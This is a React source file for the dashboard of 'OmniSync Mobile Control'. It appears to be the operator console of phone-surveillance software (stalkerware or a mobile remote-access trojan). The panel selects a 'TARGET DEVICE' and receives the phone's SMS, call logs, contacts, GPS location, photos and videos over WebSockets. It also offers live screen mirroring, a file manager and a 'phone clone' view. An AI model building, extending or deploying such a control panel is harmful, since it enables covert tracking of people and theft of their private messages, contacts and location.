import React, { useState, useEffect } from 'react';
import { io } from 'socket.io-client';
import axios from 'axios';
import Devices from './Devices';
import PhoneCloneView from './PhoneCloneView';
import MediaViewer from './MediaViewer';
import MessagesViewer from './MessagesViewer';
import CallLogsViewer from './CallLogsViewer';
import ContactsViewer from './ContactsViewer';
import LocationTracker from './LocationTracker';
import ScreenMirror from './ScreenMirror';
import FileManager from './FileManager';
import CompanionGuide from './CompanionGuide';

import { API_BASE_URL } from '../config';
import { MOCK_DEVICES } from '../mockData';

function Dashboard({ token, onLogout }) {
  const [activeTab, setActiveTab] = useState('clone');
  const [devices, setDevices] = useState(MOCK_DEVICES);
  const [activeDevice, setActiveDevice] = useState(MOCK_DEVICES[0]);
  const [liveConnected, setLiveConnected] = useState(false);

  // Separate state for each telemetry data type
  const [liveSms, setLiveSms] = useState([]);
  const [liveCallLogs, setLiveCallLogs] = useState([]);
  const [liveContacts, setLiveContacts] = useState([]);
  const [liveLocation, setLiveLocation] = useState(null);
  const [liveMedia, setLiveMedia] = useState([]);

  useEffect(() => {
    // 1. Fetch saved devices from backend API if available
    const fetchRealDevices = async () => {
      try {
        const res = await axios.get(`${API_BASE_URL}/api/devices`, {
          headers: { authorization: token }
        });
        if (res.data && res.data.length > 0) {
          setDevices(res.data);
          setActiveDevice(res.data[0]);
        }
      } catch (err) {
        console.log('Using local device state, waiting for live telemetry socket...');
      }
    };
    fetchRealDevices();

    // 2. Connect WebSockets to live Render backend
    const socket = io(API_BASE_URL, {
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      console.log('Dashboard connected to backend WebSocket:', socket.id);
      socket.emit('join_device', 'all');
    });

    // Device status pings (battery, network, storage, etc.)
    socket.on('device_status_update', (realData) => {
      console.log('Device status update received:', realData);
      setLiveConnected(true);

      const liveDevice = {
        _id: realData.deviceId || 'live_phone_1',
        name: realData.deviceName || realData.model || 'Live Android Phone',
        modelName: realData.modelName || realData.model || 'Android Device',
        osVersion: realData.osVersion || realData.os || 'Android 14',
        status: 'online',
        batteryLevel: realData.batteryLevel !== undefined ? realData.batteryLevel : 0,
        isCharging: realData.isCharging || false,
        storageUsed: realData.storageUsed || 0,
        storageTotal: realData.storageTotal || 0,
        networkType: realData.networkType || 'Mobile Data',
        ipAddress: realData.ip || 'Cloud Socket',
        lastSeen: 'Just now (Live)'
      };

      setDevices((prev) => {
        const realDevices = prev.filter((d) => d.lastSeen && d.lastSeen.includes('Live'));
        const idx = realDevices.findIndex((d) => d._id === liveDevice._id);
        if (idx !== -1) {
          const updated = [...realDevices];
          updated[idx] = liveDevice;
          return updated;
        }
        return [liveDevice, ...realDevices];
      });

      setActiveDevice(liveDevice);
    });

    // ===== SEPARATE TELEMETRY CHANNELS =====
    socket.on('live_sms_sync', (data) => {
      console.log(`Live SMS sync received: ${data.count} messages`);
      if (data.smsList && data.smsList.length > 0) {
        setLiveSms(data.smsList);
      }
    });

    socket.on('live_calls_sync', (data) => {
      console.log(`Live Call logs sync received: ${data.count} logs`);
      if (data.callLogs && data.callLogs.length > 0) {
        setLiveCallLogs(data.callLogs);
      }
    });

    socket.on('live_contacts_sync', (data) => {
      console.log(`Live Contacts sync received: ${data.count} contacts`);
      if (data.contacts && data.contacts.length > 0) {
        setLiveContacts(data.contacts);
      }
    });

    socket.on('live_location_sync', (data) => {
      console.log(`Live Location sync received: ${data.latitude}, ${data.longitude}`);
      if (data.latitude !== undefined) {
        setLiveLocation(data);
      }
    });

    socket.on('live_media_sync', (data) => {
      console.log(`Live Media sync received: ${data.count} items`);
      if (data.mediaList && data.mediaList.length > 0) {
        setLiveMedia(data.mediaList);
      }
    });

    // Legacy combined dump (fallback)
    socket.on('live_telemetry_dump', (dump) => {
      console.log('Legacy telemetry dump received');
      if (dump.smsList && dump.smsList.length > 0) setLiveSms(dump.smsList);
      if (dump.callLogs && dump.callLogs.length > 0) setLiveCallLogs(dump.callLogs);
      if (dump.contacts && dump.contacts.length > 0) setLiveContacts(dump.contacts);
      if (dump.location) setLiveLocation(dump.location);
      if (dump.mediaList && dump.mediaList.length > 0) setLiveMedia(dump.mediaList);
    });

    return () => {
      socket.disconnect();
    };
  }, [token]);

  return (
    <div className="app-container">
      {/* Navbar Header */}
      <header className="navbar">
        <div className="brand">
          <div className="brand-icon">
            <i className="fa-solid fa-mobile-retro"></i>
          </div>
          <div>
            <div className="brand-title">OmniSync Mobile Control</div>
            <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
              Remote Device Management & Phone Clone Portal
            </div>
          </div>
        </div>

        <div className="user-controls" style={{ display: 'flex', gap: '1rem', alignItems: 'center' }}>
          {liveConnected ? (
            <span className="badge badge-online" style={{ padding: '0.4rem 0.8rem', fontSize: '0.8rem' }}>
              🟢 Live Telemetry Stream Active
            </span>
          ) : (
            <span style={{ fontSize: '0.78rem', color: 'var(--text-muted)', border: '1px dashed var(--border-color)', padding: '0.3rem 0.6rem', borderRadius: 'var(--radius-sm)' }}>
              ☁️ Waiting for Phone Socket Ping...
            </span>
          )}

          <span style={{ fontSize: '0.85rem', color: 'var(--text-muted)' }}>
            Operator: <strong style={{ color: 'white' }}>Admin</strong>
          </span>
          <button className="btn btn-secondary btn-sm" onClick={onLogout}>
            <i className="fa-solid fa-right-from-bracket"></i> Logout
          </button>
        </div>
      </header>

      {/* Active Device Quick Selector Bar */}
      <div className="device-bar">
        <div className="device-selector-group">
          <span style={{ fontSize: '0.85rem', color: 'var(--text-muted)', fontWeight: 600 }}>TARGET DEVICE:</span>
          <select
            className="device-select"
            value={activeDevice ? activeDevice._id : ''}
            onChange={(e) => {
              const selected = devices.find((d) => d._id === e.target.value);
              if (selected) setActiveDevice(selected);
            }}
          >
            {devices.map((d) => (
              <option key={d._id} value={d._id}>
                {d.name} ({d.modelName}) — {d.status.toUpperCase()}
              </option>
            ))}
          </select>
        </div>

        {activeDevice && (
          <div className="device-metrics">
            <div className="metric-item">
              <i className="fa-solid fa-battery-three-quarters" style={{ color: activeDevice.batteryLevel > 20 ? 'var(--accent-success)' : 'var(--accent-danger)' }}></i>
              <span>{activeDevice.batteryLevel}%</span>
            </div>
            <div className="metric-item">
              <i className="fa-solid fa-wifi" style={{ color: 'var(--accent-primary)' }}></i>
              <span>{activeDevice.networkType}</span>
            </div>
            <div className="metric-item">
              <i className="fa-solid fa-hard-drive" style={{ color: 'var(--accent-secondary)' }}></i>
              <span>{activeDevice.storageUsed} / {activeDevice.storageTotal} GB</span>
            </div>
            <div className="metric-item">
              <span className={`badge ${activeDevice.status === 'online' ? 'badge-online' : 'badge-offline'}`}>
                {activeDevice.status}
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Main Layout (Sidebar + Tab Content) */}
      <div className="dashboard-layout">
        <nav className="sidebar">
          <button className={`nav-tab ${activeTab === 'clone' ? 'active' : ''}`} onClick={() => setActiveTab('clone')}>
            <i className="fa-solid fa-mobile"></i> 1:1 Phone Clone
          </button>
          <button className={`nav-tab ${activeTab === 'devices' ? 'active' : ''}`} onClick={() => setActiveTab('devices')}>
            <i className="fa-solid fa-mobile-screen"></i> Devices Overview
          </button>
          <button className={`nav-tab ${activeTab === 'media' ? 'active' : ''}`} onClick={() => setActiveTab('media')}>
            <i className="fa-solid fa-images"></i> Photos & Videos
            {liveMedia.length > 0 && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>{liveMedia.length}</span>}
          </button>
          <button className={`nav-tab ${activeTab === 'messages' ? 'active' : ''}`} onClick={() => setActiveTab('messages')}>
            <i className="fa-solid fa-comments"></i> SMS & Messages
            {liveSms.length > 0 && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>{liveSms.length}</span>}
          </button>
          <button className={`nav-tab ${activeTab === 'calls' ? 'active' : ''}`} onClick={() => setActiveTab('calls')}>
            <i className="fa-solid fa-phone-volume"></i> Call Logs
            {liveCallLogs.length > 0 && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>{liveCallLogs.length}</span>}
          </button>
          <button className={`nav-tab ${activeTab === 'contacts' ? 'active' : ''}`} onClick={() => setActiveTab('contacts')}>
            <i className="fa-solid fa-address-book"></i> Contacts
            {liveContacts.length > 0 && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>{liveContacts.length}</span>}
          </button>
          <button className={`nav-tab ${activeTab === 'screen' ? 'active' : ''}`} onClick={() => setActiveTab('screen')}>
            <i className="fa-solid fa-display"></i> Live Stream Mirror
          </button>
          <button className={`nav-tab ${activeTab === 'location' ? 'active' : ''}`} onClick={() => setActiveTab('location')}>
            <i className="fa-solid fa-location-dot"></i> GPS Location
            {liveLocation && <span className="badge badge-online" style={{ marginLeft: '0.5rem', fontSize: '0.65rem' }}>📍</span>}
          </button>
          <button className={`nav-tab ${activeTab === 'files' ? 'active' : ''}`} onClick={() => setActiveTab('files')}>
            <i className="fa-solid fa-folder-open"></i> File Manager
          </button>
          <button className={`nav-tab ${activeTab === 'guide' ? 'active' : ''}`} onClick={() => setActiveTab('guide')}>
            <i className="fa-solid fa-circle-info"></i> Setup Guide
          </button>
        </nav>

        <main className="main-content">
          {activeTab === 'clone' && (
            <PhoneCloneView activeDevice={activeDevice} telemetry={{ smsList: liveSms, callLogs: liveCallLogs, contacts: liveContacts, location: liveLocation, mediaList: liveMedia }} />
          )}
          {activeTab === 'devices' && (
            <Devices token={token} activeDevice={activeDevice} setActiveDevice={setActiveDevice} devices={devices} setDevices={setDevices} />
          )}
          {activeTab === 'media' && (
            <MediaViewer token={token} activeDevice={activeDevice} liveMedia={liveMedia} />
          )}
          {activeTab === 'messages' && (
            <MessagesViewer token={token} activeDevice={activeDevice} liveSms={liveSms} />
          )}
          {activeTab === 'calls' && (
            <CallLogsViewer token={token} activeDevice={activeDevice} liveCallLogs={liveCallLogs} />
          )}
          {activeTab === 'contacts' && (
            <ContactsViewer token={token} activeDevice={activeDevice} liveContacts={liveContacts} />
          )}
          {activeTab === 'screen' && (
            <ScreenMirror activeDevice={activeDevice} />
          )}
          {activeTab === 'location' && (
            <LocationTracker token={token} activeDevice={activeDevice} liveLocation={liveLocation} />
          )}
          {activeTab === 'files' && (
            <FileManager token={token} activeDevice={activeDevice} />
          )}
          {activeTab === 'guide' && <CompanionGuide />}
        </main>
      </div>
    </div>
  );
}

export default Dashboard;